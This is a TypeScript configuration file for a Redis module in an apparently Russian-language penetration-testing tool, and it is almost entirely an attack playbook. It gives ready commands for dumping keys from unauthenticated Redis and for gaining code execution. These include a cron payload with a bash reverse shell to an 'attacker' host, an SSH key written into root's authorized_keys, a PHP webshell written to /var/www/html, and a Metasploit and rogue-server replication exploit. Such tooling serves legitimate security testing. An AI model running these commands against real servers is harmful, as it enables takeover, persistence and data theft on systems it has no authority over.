/**
 * Redis Service Configuration
 * Redis In-Memory Data Store
 * 
 * @version 1.0.0
 * @author Security Team
 */
import type { ServiceConfig } from '../types';

export const redisConfig: ServiceConfig = {
  id: 'redis',
  name: 'Redis',
  description: 'Redis - быстрый in-memory хранилище данных типа "ключ-значение". Часто используется для кэширования, сессий и очередей сообщений. Очень часто развертывается без аутентификации, что позволяет получить RCE.',
  categoryId: 'database',
  version: '1.0.0',
  tags: ['database', 'cache', 'nosql', 'key-value', 'memory'],

  matchers: {
    serviceNames: ['redis'],
    cpePatterns: ['cpe:/a:redis:redis'],
    bannerRegex: [
      'REDIS',
      'redis_version',
      '-NOAUTH',
      '-ERR',
    ],
    productPatterns: ['Redis'],
    standardPorts: [6379, 6380],
    nseScriptMatchers: [
      { scriptName: 'redis-info', outputPattern: '.' },
    ],
  },

  confidenceThreshold: 40,

  techniques: [
    {
      id: 'redis-enum',
      name: 'Redis Enumeration',
      mitreId: 'T1046',
      description: 'Сбор информации о Redis сервере.',
      commands: [
        { tool: 'nmap', command: 'nmap -p 6379 --script redis-info <target>', description: 'Redis info scan' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> INFO', description: 'Redis INFO command' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> CONFIG GET *', description: 'Get all config' },
      ],
      nseScripts: [
        { name: 'redis-info', description: 'Информация о Redis', safe: true },
      ],
      difficulty: 'easy',
      tags: ['enumeration', 'reconnaissance'],
    },
    {
      id: 'redis-unauth',
      name: 'Unauthenticated Access',
      mitreId: 'T1078',
      description: 'Подключение к Redis без пароля. Очень распространено.',
      commands: [
        { tool: 'redis-cli', command: 'redis-cli -h <target> PING', description: 'Test connection' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> KEYS \'*\'', description: 'List all keys' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> GET secret_key', description: 'Get specific key' },
      ],
      difficulty: 'easy',
      tags: ['misconfiguration', 'unauthenticated'],
    },
    {
      id: 'redis-rce-cron',
      name: 'RCE via Cron',
      mitreId: 'T1053',
      description: 'Получение RCE через запись в crontab (требует root Redis).',
      commands: [
        { tool: 'redis-cli', command: 'redis-cli -h <target> CONFIG SET dir /var/spool/cron/', description: 'Set directory to cron' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> CONFIG SET dbfilename root', description: 'Set filename' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> SET x "\\n\\n*/1 * * * * /bin/bash -c \'bash -i >& /dev/tcp/attacker/4444 0>&1\'\\n\\n"', description: 'Set cron payload' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> SAVE', description: 'Save to disk' },
      ],
      difficulty: 'medium',
      prerequisites: ['Redis без аутентификации', 'Redis запущен от root'],
      tags: ['rce', 'cron', 'privilege-escalation'],
    },
    {
      id: 'redis-rce-ssh',
      name: 'RCE via SSH Keys',
      mitreId: 'T1021.004',
      description: 'Добавление SSH ключа через Redis.',
      commands: [
        { tool: 'redis-cli', command: 'redis-cli -h <target> CONFIG SET dir /root/.ssh/', description: 'Set directory to .ssh' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> CONFIG SET dbfilename authorized_keys', description: 'Set filename' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> SET x "\\n\\nssh-rsa AAAA...\\n\\n"', description: 'Set SSH public key' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> SAVE', description: 'Save to disk' },
      ],
      difficulty: 'medium',
      prerequisites: ['Redis без аутентификации', 'Redis запущен от root', 'SSH key pair'],
      tags: ['rce', 'ssh', 'lateral-movement'],
    },
    {
      id: 'redis-rce-webshell',
      name: 'RCE via Webshell',
      description: 'Запись webshell через Redis.',
      commands: [
        { tool: 'redis-cli', command: 'redis-cli -h <target> CONFIG SET dir /var/www/html/', description: 'Set directory to webroot' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> CONFIG SET dbfilename shell.php', description: 'Set filename' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> SET x "<?php system($_GET[\'c\']); ?>"', description: 'Set webshell content' },
        { tool: 'redis-cli', command: 'redis-cli -h <target> SAVE', description: 'Save to disk' },
      ],
      difficulty: 'medium',
      prerequisites: ['Redis без аутентификации', 'Права на запись в webroot'],
      tags: ['rce', 'webshell', 'post-exploitation'],
    },
    {
      id: 'redis-slave-rce',
      name: 'Slave RCE Exploit',
      mitreId: 'T1059',
      description: 'Эксплуатация уязвимости Redis master-slave replication (Redis 4.x-5.x).',
      commands: [
        { tool: 'metasploit', command: 'use exploit/linux/redis/redis_replication_cmd_exec', description: 'MSF exploit' },
        { tool: 'rogue-server', command: 'python3 redis-rogue-server.py --rhost <target> --lhost <attacker>', description: 'Rogue server exploit' },
      ],
      difficulty: 'hard',
      prerequisites: ['Redis 4.x-5.x без аутентификации'],
      cves: [
        { cveId: 'CVE-2017-15011', cvss: 9.8, description: 'Redis replication RCE' },
      ],
      tags: ['rce', 'exploitation', 'vulnerability'],
    },
  ],

  triggers: [],

  ui: {
    icon: 'database',
    color: '#dc2626',
    displayPriority: 90,
  },

  references: [
    { title: 'Redis Pentesting', url: 'https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis' },
    { title: 'Redis RCE', url: 'https://github.com/vulhub/redis-rogue-getshell' },
  ],

  notes: 'Redis почти всегда без аутентификации. RCE через CONFIG SET - классика CTF. Проверяйте версию для slave-rce эксплойта.',
};

export default redisConfig;
